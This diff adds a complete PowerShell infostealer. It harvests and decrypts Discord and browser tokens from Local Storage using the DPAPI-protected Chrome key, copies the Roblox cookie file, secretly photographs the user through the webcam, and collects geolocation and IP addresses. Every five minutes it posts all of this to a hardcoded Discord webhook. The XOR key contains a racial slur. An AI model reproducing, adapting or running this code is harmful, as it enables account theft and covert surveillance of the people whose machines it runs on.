@@ -1,0 +1,475 @@
+Add-Type -AssemblyName System.Device
+Add-Type -AssemblyName System.Security
+Add-Type -AssemblyName System.Drawing,System.Windows.Forms
+$LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
+$ROAMING = [System.Environment]::GetEnvironmentVariable("APPDATA")
+$PATHS = @{
+    'Discord' = "$ROAMING\discord"
+    'Discord Canary' = "$ROAMING\discordcanary"
+    'Lightcord' = "$ROAMING\Lightcord"
+    'Discord PTB' = "$ROAMING\discordptb"
+    'Opera' = "$ROAMING\Opera Software\Opera Stable"
+    'Opera GX' = "$ROAMING\Opera Software\Opera GX Stable"
+    'Amigo' = "$LOCAL\Amigo\User Data"
+    'Torch' = "$LOCAL\Torch\User Data"
+    'Kometa' = "$LOCAL\Kometa\User Data"
+    'Orbitum' = "$LOCAL\Orbitum\User Data"
+    'CentBrowser' = "$LOCAL\CentBrowser\User Data"
+    '7Star' = "$LOCAL\7Star\7Star\User Data"
+    'Sputnik' = "$LOCAL\Sputnik\Sputnik\User Data"
+    'Vivaldi' = "$LOCAL\Vivaldi\User Data\Default"
+    'Chrome SxS' = "$LOCAL\Google\Chrome SxS\User Data"
+    'Chrome' = "$LOCAL\Google\Chrome\User Data\Default"
+    'Epic Privacy Browser' = "$LOCAL\Epic Privacy Browser\User Data"
+    'Microsoft Edge' = "$LOCAL\Microsoft\Edge\User Data\Defaul"
+    'Uran' = "$LOCAL\uCozMedia\Uran\User Data\Default"
+    'Yandex' = "$LOCAL\Yandex\YandexBrowser\User Data\Default"
+    'Brave' = "$LOCAL\BraveSoftware\Brave-Browser\User Data\Default"
+    'Iridium' = "$LOCAL\Iridium\User Data\Default"
+}
+$pattern = @"
+dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*
+"@
+$geo = New-Object System.Device.Location.GeoCoordinateWatcher
+$geo.Start()
+Start-Sleep -Seconds 3
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.Runtime.InteropServices.ComTypes;
+
+public static class BC
+{
+    [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)]
+    public static extern int BCryptOpenAlgorithmProvider(out IntPtr hAlg, string alg, string impl, int flags);
+
+    [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)]
+    public static extern int BCryptSetProperty(IntPtr hObj, string prop, byte[] value, int size, int flags);
+
+    [DllImport("bcrypt.dll")]
+    public static extern int BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr hKey, IntPtr pbKeyObj, int cbKeyObj, byte[] key, int cbKey, int flags);
+
+    [DllImport("bcrypt.dll")]
+    public static extern int BCryptDecrypt(IntPtr hKey, byte[] input, int inputLen, IntPtr padding, byte[] iv, int ivLen, byte[] output, int outputLen, out int result, int flags);
+
+    [DllImport("bcrypt.dll")]
+    public static extern int BCryptDestroyKey(IntPtr hKey);
+
+    [DllImport("bcrypt.dll")]
+    public static extern int BCryptCloseAlgorithmProvider(IntPtr hAlg, int flags);
+}
+
+[StructLayout(LayoutKind.Sequential)]
+public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
+{
+    public int cbSize;
+    public int dwInfoVersion;
+    public IntPtr pbNonce;
+    public int cbNonce;
+    public IntPtr pbAuthData;
+    public int cbAuthData;
+    public IntPtr pbTag;
+    public int cbTag;
+    public IntPtr pbMacContext;
+    public int cbMacContext;
+    public int cbAAD;
+    public long cbData;
+    public int dwFlags;
+}
+"@
+
+function Decrypt-AesGcmData {
+    param(
+        [byte[]]$Key,
+        [string]$Data
+    )
+
+    $blob = [Convert]::FromBase64String(($Data -split ':')[1])
+
+    [byte[]]$nonce      = $blob[3..14]
+    [byte[]]$tag        = $blob[($blob.Length - 16)..($blob.Length - 1)]
+    [byte[]]$ciphertext = $blob[15..($blob.Length - 17)]
+
+    $alg       = [IntPtr]::Zero
+    $keyHandle = [IntPtr]::Zero
+
+    [BC]::BCryptOpenAlgorithmProvider([ref]$alg, "AES", $null, 0) | Out-Null
+
+    $mode = [Text.Encoding]::Unicode.GetBytes("ChainingModeGCM`0")
+    [BC]::BCryptSetProperty($alg, "ChainingMode", $mode, $mode.Length, 0) | Out-Null
+
+    [BC]::BCryptGenerateSymmetricKey($alg, [ref]$keyHandle, [IntPtr]::Zero, 0, $Key, $Key.Length, 0) | Out-Null
+
+    $nonceHandle = [Runtime.InteropServices.GCHandle]::Alloc($nonce, [Runtime.InteropServices.GCHandleType]::Pinned)
+    $tagHandle   = [Runtime.InteropServices.GCHandle]::Alloc($tag,   [Runtime.InteropServices.GCHandleType]::Pinned)
+
+    try {
+        $authInfo = New-Object BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
+        $authInfo.cbSize        = [Runtime.InteropServices.Marshal]::SizeOf($authInfo)
+        $authInfo.dwInfoVersion = 1
+        $authInfo.pbNonce       = $nonceHandle.AddrOfPinnedObject()
+        $authInfo.cbNonce       = $nonce.Length
+        $authInfo.pbTag         = $tagHandle.AddrOfPinnedObject()
+        $authInfo.cbTag         = $tag.Length
+
+        $authInfoPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($authInfo.cbSize)
+        [Runtime.InteropServices.Marshal]::StructureToPtr($authInfo, $authInfoPtr, $false)
+
+        [byte[]]$out = New-Object byte[] $ciphertext.Length
+        $written = 0
+
+        $status = [BC]::BCryptDecrypt(
+            $keyHandle,
+            $ciphertext,
+            $ciphertext.Length,
+            $authInfoPtr,
+            $null,
+            0,
+            $out,
+            $out.Length,
+            [ref]$written,
+            0
+        )
+
+        [Runtime.InteropServices.Marshal]::FreeHGlobal($authInfoPtr)
+
+        if ($status -ne 0) {
+            throw ("Decrypt failed: 0x{0:X8}" -f $status)
+        }
+
+        return [Text.Encoding]::UTF8.GetString($out, 0, $written)
+    }
+    finally {
+        if ($nonceHandle.IsAllocated) { $nonceHandle.Free() }
+        if ($tagHandle.IsAllocated)   { $tagHandle.Free() }
+        [BC]::BCryptDestroyKey($keyHandle) | Out-Null
+        [BC]::BCryptCloseAlgorithmProvider($alg, 0) | Out-Null
+    }
+}
+
+function Invoke-XOR {
+    param(
+        [string]$Key,
+        [string]$Data
+    )
+
+    $keyBytes  = [System.Text.Encoding]::UTF8.GetBytes($Key)
+    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
+    $result    = New-Object byte[] $dataBytes.Length
+
+    for ($i = 0; $i -lt $dataBytes.Length; $i++) {
+        $result[$i] = $dataBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
+    }
+
+    return [Convert]::ToBase64String($result)
+}
+
+function Take-WebCamPhoto {
+    param(
+        [int]$CamIndex = 0,
+        [string]$OutputPath = "$env:USERPROFILE\Desktop\webcam_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
+    )
+
+    $source = @'
+using System;
+using System.Runtime.InteropServices;
+using System.Drawing;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace WebCamLib
+{
+    public class CamCapture
+    {
+        private const int WM_CAP_START = 0x400;
+        private const int WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
+        private const int WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
+        private const int WM_CAP_EDIT_COPY = WM_CAP_START + 30;
+
+        [DllImport("avicap32.dll")]
+        private static extern IntPtr capCreateCaptureWindowA(
+            string lpszWindowName,
+            int dwStyle,
+            int x,
+            int y,
+            int nWidth,
+            int nHeight,
+            IntPtr hWndParent,
+            int nID);
+
+        [DllImport("user32.dll")]
+        private static extern int SendMessage(
+            IntPtr hwnd,
+            int wMsg,
+            int wParam,
+            int lParam);
+
+        [DllImport("user32.dll")]
+        private static extern bool DestroyWindow(IntPtr hwnd);
+
+        public static Bitmap Capture(int deviceIndex)
+        {
+            IntPtr handle = capCreateCaptureWindowA(
+                "cap",
+                0,
+                0,
+                0,
+                1,
+                1,
+                IntPtr.Zero,
+                0);
+
+            if (handle == IntPtr.Zero)
+                throw new Exception("Failed to create capture window.");
+
+            if (SendMessage(handle, WM_CAP_DRIVER_CONNECT, deviceIndex, 0) == 0)
+            {
+                DestroyWindow(handle);
+                throw new Exception("Failed to connect to camera.");
+            }
+
+            Thread.Sleep(500);
+
+            Clipboard.Clear();
+            SendMessage(handle, WM_CAP_EDIT_COPY, 0, 0);
+
+            Bitmap bmp = null;
+
+            for (int i = 0; i < 10; i++)
+            {
+                Thread.Sleep(100);
+
+                if (Clipboard.ContainsImage())
+                {
+                    bmp = new Bitmap(Clipboard.GetImage());
+                    Clipboard.Clear();
+                    break;
+                }
+            }
+
+            SendMessage(handle, WM_CAP_DRIVER_DISCONNECT, deviceIndex, 0);
+            DestroyWindow(handle);
+
+            return bmp;
+        }
+    }
+}
+'@
+
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.Drawing
+    try {
+        $bitmap = [WebCamLib.CamCapture]::Capture($CamIndex)
+
+        if ($null -eq $bitmap) {
+            return [byte[]]@(255)
+        }
+
+        $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |
+                    Where-Object { $_.FormatDescription -eq "JPEG" }
+
+        $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters
+        $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter(
+            [System.Drawing.Imaging.Encoder]::Quality, [long]95)
+
+        $memStream = New-Object System.IO.MemoryStream
+        $bitmap.Save($memStream, $jpegCodec, $encoderParams)
+        
+        $imgdata = $memStream.ToArray()
+        
+        $bitmap.Dispose()
+        $encoderParams.Dispose()
+        $memStream.Dispose()
+        
+        return $imgdata 
+        }
+    catch {
+        return [byte[]]@(255)
+    }
+}
+
+function Unprotect-DPAPI-Key {
+    param(
+        [string]$b64Key
+    )
+
+    $keyBytes = [Convert]::FromBase64String($b64Key)
+    $keyTrimmed = $keyBytes[5..($keyBytes.Length - 1)]
+    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
+        $keyTrimmed, 
+        $null, 
+        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+    )
+    return $decrypted
+}
+
+function Get-Tokens {
+    param($path)
+    $tokens = @()
+    $path += "\Local Storage\leveldb\"
+
+    if (!(Test-Path $path)) {
+        return $tokens
+    }
+
+    $files = Get-ChildItem -Path $path
+    foreach ($file in $files) {
+        if ($file.Name -notlike "*.ldb" -and $file.Name -like "*.log") {
+            continue
+        }
+
+        try {
+            $lines = Get-Content -Path $file.FullName -ErrorAction SilentlyContinue
+            foreach ($line in $lines) {
+                $matchess = [regex]::Matches($line, $pattern)
+                foreach ($match in $matchess) {
+                    $tokens += $match.Value
+                }
+            }
+        } catch {
+            continue
+        }
+    }
+
+    return $tokens
+}
+
+function Get-Key {
+    param($path)
+    $localStatePath = Join-Path $path "Local State"
+    $jsonContent = Get-Content -Path $localStatePath | Out-String
+    $key = ($jsonContent | ConvertFrom-Json).os_crypt.encrypted_key
+    return $key
+}
+while ($true) {
+$tokenlist  = New-Object System.Collections.Generic.List[string]
+$imgdata = Take-WebCamPhoto
+foreach ($platform in $PATHS.Keys) {
+    $path = $PATHS[$platform]
+    if (!(Test-Path $path)) {
+        continue
+    }
+    $tokens = Get-Tokens -path $path
+    foreach ($token in $tokens) {
+        $token = $token -replace '\\', ''
+        try {
+            $key = Get-Key -path $path
+            $key = Unprotect-DPAPI-Key -b64Key $key
+
+            $token = Decrypt-AesGcmData -Key $key -Data $token
+
+            $header = @{
+                "Content-Type" =  "application/json"
+                "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
+                "Authorization" = $token
+            }
+
+            $header
+
+            $response = Invoke-WebRequest -UseBasicParsing -Uri "https://discord.com/api/v10/users/@me" -Method GET -Headers $header
+
+            if ($response.StatusCode -eq 200) {
+                $token = Invoke-XOR -Key "fuckniggers" -Data $token
+                $tokenlist.Add($token)
+            } 
+        } catch {
+            Write-Host "An error occurred:" $_.Exception.Message
+        }
+    }
+}
+
+$rblxfile = "$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat"
+
+        if (Test-Path $rblxfile) {
+            $robloxBytes = [System.IO.File]::ReadAllBytes($rblxfile)
+        }
+        else {
+            $robloxBytes = [byte[]]@(0x58)
+        }
+        
+        $location
+
+        if ($geo.Position.Location.IsUnknown) {
+            Write-Host "Could not get location. Make sure Windows Location Services are enabled."
+        } else {
+            $lat = $geo.Position.Location.Latitude
+            $lon = $geo.Position.Location.Longitude
+            $acc = $geo.Position.Location.HorizontalAccuracy
+            $location = @"
+    "Latitude": "$lat",
+    "Longitude": "$lon",
+    "Accuracy": "$acc"
+"@
+        }
+
+        $ipv4 = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.ipify.org?format=json").Content | ConvertFrom-Json
+            $ipv4 = $ipv4.ip
+
+            $ipv6 = (Invoke-WebRequest -UseBasicParsing -Uri "https://api6.ipify.org?format=json").Content | ConvertFrom-Json
+            $ipv6 = $ipv6.ip
+
+            $t = '```json'
+            $t2 = '```'
+            $tokenlist = $tokenlist | Select-Object -Unique
+            $tokenlist = $tokenlist -join '", "'
+            $message = @"
+$t
+{
+"tokens": ["$tokenlist"],
+"ipv4": "$ipv4",
+"ipv6": "$ipv6",
+"location": {$location}
+}
+$t2
+"@
+
+            $fileName1 = "image.png"
+            $fileName2 = "roblox.txt"
+
+            $boundary = [System.Guid]::NewGuid().ToString()
+            $LF = "`r`n"
+
+            $header =
+            "--$boundary$LF" +
+            "Content-Disposition: form-data; name=`"username`"$LF$LF" +
+            "$env:COMPUTERNAME | $env:USERNAME$LF" +
+
+            "--$boundary$LF" +
+            "Content-Disposition: form-data; name=`"content`"$LF$LF" +
+            "$message$LF"
+
+            $imgHeader =
+            "--$boundary$LF" +
+            "Content-Disposition: form-data; name=`"file1`"; filename=`"$fileName1`"$LF" +
+            "Content-Type: application/octet-stream$LF$LF"
+
+            $txtHeader =
+            "$LF--$boundary$LF" +
+            "Content-Disposition: form-data; name=`"file2`"; filename=`"$fileName2`"$LF" +
+            "Content-Type: text/plain$LF$LF"
+
+            $footer = "$LF--$boundary--$LF"
+
+            $stream = New-Object System.IO.MemoryStream
+
+            $headerBytes    = [System.Text.Encoding]::UTF8.GetBytes($header)
+            $imgHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($imgHeader)
+            $txtHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($txtHeader)
+            $footerBytes    = [System.Text.Encoding]::UTF8.GetBytes($footer)
+
+            $stream.Write($headerBytes, 0, $headerBytes.Length)
+
+            $stream.Write($imgHeaderBytes, 0, $imgHeaderBytes.Length)
+            $stream.Write($imgdata, 0, $imgdata.Length)
+
+            $stream.Write($txtHeaderBytes, 0, $txtHeaderBytes.Length)
+            $stream.Write($robloxBytes, 0, $robloxBytes.Length)
+
+            $stream.Write($footerBytes, 0, $footerBytes.Length)
+
+            $stream.Position = 0
+            Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1502344139797430323/bwsio26_sCw33qTMrEJR94QcLP2jhdSkE2CQ-e10dRi-OFdK0onAQNier0BolSJEvGxB" -Method Post -Body $stream.ToArray() -ContentType "multipart/form-data; boundary=$boundary"
+Start-Sleep -Seconds 300
+}
